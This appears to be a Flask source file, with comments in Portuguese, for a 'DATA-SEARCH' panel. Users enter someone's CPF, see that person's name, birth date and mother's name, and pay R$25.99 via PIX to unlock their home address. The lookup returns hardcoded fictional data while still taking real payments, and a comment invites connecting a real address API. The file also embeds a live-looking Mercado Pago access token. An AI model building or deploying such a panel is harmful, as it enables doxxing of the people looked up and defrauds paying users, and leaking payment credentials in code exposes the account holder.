from flask import Flask, render_template_string, request, jsonify
import mercadopago
import random
import os

app = Flask(__name__)

# ================= CONFIGURAÇÃO MERCADO PAGO =================
ACCESS_TOKEN = "APP_USR-8139252928482096-012603-77b3beb71b77902ddc85b309e1f0d3f0-1378615355"
sdk = mercadopago.SDK(ACCESS_TOKEN)
VALOR_CONSULTA = 25.99
# =============================================================

@app.route('/')
def index():
    # Criamos o pagamento inicial para o caso do usuário querer liberar os dados
    payment_data = {
        "transaction_amount": VALOR_CONSULTA,
        "description": "Liberação de Dossiê Cadastral Completo",
        "payment_method_id": "pix",
        "payer": {"email": "consulta@painel.com", "first_name": "Usuario", "last_name": "Busca"}
    }
    
    request_options = mercadopago.config.RequestOptions()
    request_options.custom_headers = {"x-idempotency-key": str(random.randint(1, 999999))}

    try:
        payment_response = sdk.payment().create(payment_data, request_options)
        payment = payment_response["response"]
        payment_id = payment.get("id")
        qr_code = payment["point_of_interaction"]["transaction_data"]["qr_code_base64"]
        pix_copia_cola = payment["point_of_interaction"]["transaction_data"]["qr_code"]
    except:
        payment_id, qr_code, pix_copia_cola = "", "", ""

    return render_template_string(HTML_PANEL, qr_code=qr_code, pix_payload=pix_copia_cola, payment_id=payment_id)

@app.route('/consultar/<cpf>')
def api_consulta(cpf):
    # Aqui simulamos o retorno da API. 
    # IMPORTANTE: Conecte aqui sua API real de endereços quando tiver.
    dados = {
        "nome": "MIKAEL FERREIRA DA SILVA",
        "nascimento": "15/08/1992",
        "idade": "33 anos",
        "mae": "MARIA DA SILVA FERREIRA",
        "logradouro": "RUA DAS PALMEIRAS",
        "numero": "1240",
        "bairro": "CENTRO",
        "cidade": "SÃO PAULO",
        "estado": "SP",
        "cep": "01202-001"
    }
    return jsonify(dados)

@app.route('/verificar_pagamento/<payment_id>')
def verificar(payment_id):
    payment_info = sdk.payment().get(payment_id)
    if payment_info["response"].get("status") == "approved":
        return jsonify({"status": "pago"})
    return jsonify({"status": "pendente"})

# INTERFACE DO PAINEL DE CONSULTA
HTML_PANEL = r"""
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Painel de Inteligência • Consultas</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        .blur-text { filter: blur(5px); user-select: none; }
        .card { background: white; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); }
    </style>
</head>
<body class="bg-slate-100 font-sans text-slate-800">

    <div class="max-w-2xl mx-auto p-4">
        <div class="flex items-center justify-between mb-6 bg-blue-900 p-4 rounded-2xl text-white shadow-lg">
            <div class="flex items-center gap-3">
                <i class="fas fa-database text-blue-400"></i>
                <h1 class="font-bold tracking-tight">DATA-SEARCH v10.0</h1>
            </div>
            <span class="text-[10px] bg-blue-800 px-2 py-1 rounded">SISTEMA ATIVO</span>
        </div>

        <div class="card p-6 mb-6">
            <label class="block text-xs font-bold text-slate-400 uppercase mb-2">Consultar CPF</label>
            <div class="flex gap-2">
                <input type="tel" id="cpf_input" placeholder="000.000.000-00" class="flex-1 p-4 border rounded-xl font-bold text-lg focus:ring-2 focus:ring-blue-500 outline-none">
                <button onclick="buscar()" class="bg-blue-600 text-white px-6 rounded-xl font-bold hover:bg-blue-700 transition"><i class="fas fa-search"></i></button>
            </div>
        </div>

        <div id="resultados" class="hidden space-y-4">
            
            <div class="card p-5">
                <div class="flex items-center gap-2 mb-4 text-blue-600 font-bold border-b pb-2">
                    <i class="fas fa-user"></i> DADOS PESSOAIS
                </div>
                <div class="grid grid-cols-1 gap-4">
                    <div><p class="text-[10px] text-slate-400 uppercase font-bold">Nome Completo</p><p id="res_nome" class="font-bold text-slate-700"></p></div>
                    <div class="flex justify-between">
                        <div><p class="text-[10px] text-slate-400 uppercase font-bold">Nascimento</p><p id="res_nasc" class="font-bold text-slate-700"></p></div>
                        <div><p class="text-[10px] text-slate-400 uppercase font-bold">Idade</p><p id="res_idade" class="font-bold text-slate-700"></p></div>
                    </div>
                    <div><p class="text-[10px] text-slate-400 uppercase font-bold">Nome da Mãe</p><p id="res_mae" class="font-bold text-slate-700"></p></div>
                </div>
            </div>

            <div class="card p-5 border-2 border-dashed border-blue-200 bg-blue-50/50">
                <div class="flex items-center gap-2 mb-4 text-blue-600 font-bold border-b border-blue-100 pb-2">
                    <i class="fas fa-map-marker-alt"></i> ENDEREÇO E LOCALIZAÇÃO
                </div>
                
                <div id="area_bloqueada" class="text-center py-4">
                    <i class="fas fa-lock text-3xl text-blue-300 mb-3"></i>
                    <p class="text-sm font-bold text-slate-600 mb-4">Dados de endereço e contato bloqueados.</p>
                    <button onclick="abrirPagamento()" class="bg-blue-600 text-white px-6 py-3 rounded-full font-bold shadow-lg text-sm uppercase tracking-wide">Liberar Dossiê Completo por R$ 25,99</button>
                </div>

                <div id="dados_endereco" class="hidden space-y-4">
                    <div><p class="text-[10px] text-slate-400 uppercase font-bold">Logradouro</p><p id="res_rua" class="font-bold"></p></div>
                    <div class="grid grid-cols-2 gap-4">
                        <div><p class="text-[10px] text-slate-400 uppercase font-bold">Bairro</p><p id="res_bairro" class="font-bold"></p></div>
                        <div><p class="text-[10px] text-slate-400 uppercase font-bold">Cidade/UF</p><p id="res_cid" class="font-bold"></p></div>
                    </div>
                    <div><p class="text-[10px] text-slate-400 uppercase font-bold">CEP</p><p id="res_cep" class="font-bold"></p></div>
                </div>
            </div>
        </div>
    </div>

    <div id="modal_pix" class="fixed inset-0 bg-black/80 hidden items-center justify-center p-4 z-50">
        <div class="bg-white rounded-3xl p-6 w-full max-w-sm text-center">
            <h3 class="font-black text-xl mb-2">Liberação Instantânea</h3>
            <p class="text-slate-500 text-xs mb-6">Pague via PIX para visualizar o endereço completo agora.</p>
            <img src="data:image/png;base64,{{ qr_code }}" class="w-48 mx-auto mb-4 border p-2 rounded-xl">
            <button onclick="copiarPix()" class="w-full bg-slate-900 text-white p-4 rounded-xl font-bold mb-3">COPIAR CÓDIGO PIX</button>
            <button onclick="fecharModal()" class="text-slate-400 text-xs font-bold uppercase">Cancelar</button>
            <div class="mt-4 animate-pulse text-blue-600 text-[10px] font-bold">AGUARDANDO PAGAMENTO...</div>
        </div>
    </div>

    <script>
        const paymentId = "{{ payment_id }}";

        async function buscar() {
            const cpf = document.getElementById('cpf_input').value;
            if(!cpf) return alert("Digite o CPF");
            
            const res = await fetch('/consultar/' + cpf);
            const data = await res.json();

            // Preenche os dados visíveis
            document.getElementById('res_nome').innerText = data.nome;
            document.getElementById('res_nasc').innerText = data.nascimento;
            document.getElementById('res_idade').innerText = data.idade;
            document.getElementById('res_mae').innerText = data.mae;

            // Preenche os escondidos (para quando pagar)
            document.getElementById('res_rua').innerText = data.logradouro + ", " + data.numero;
            document.getElementById('res_bairro').innerText = data.bairro;
            document.getElementById('res_cid').innerText = data.cidade + "/" + data.estado;
            document.getElementById('res_cep').innerText = data.cep;

            document.getElementById('resultados').classList.remove('hidden');
            window.scrollTo({ top: 500, behavior: 'smooth' });
        }

        function abrirPagamento() {
            document.getElementById('modal_pix').classList.remove('hidden');
            document.getElementById('modal_pix').classList.add('flex');
            checkStatus();
        }

        function fecharModal() {
            document.getElementById('modal_pix').classList.add('hidden');
        }

        function copiarPix() {
            navigator.clipboard.writeText("{{ pix_payload }}");
            alert("Código Copiado!");
        }

        function checkStatus() {
            const it = setInterval(async () => {
                const r = await fetch('/verificar_pagamento/' + paymentId);
                const d = await r.json();
                if(d.status === "pago") {
                    clearInterval(it);
                    fecharModal();
                    document.getElementById('area_bloqueada').classList.add('hidden');
                    document.getElementById('dados_endereco').classList.remove('hidden');
                    alert("Acesso Liberado com Sucesso!");
                }
            }, 5000);
        }
    </script>
</body>
</html>
"""

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 8080))
    app.run(host='0.0.0.0', port=port)
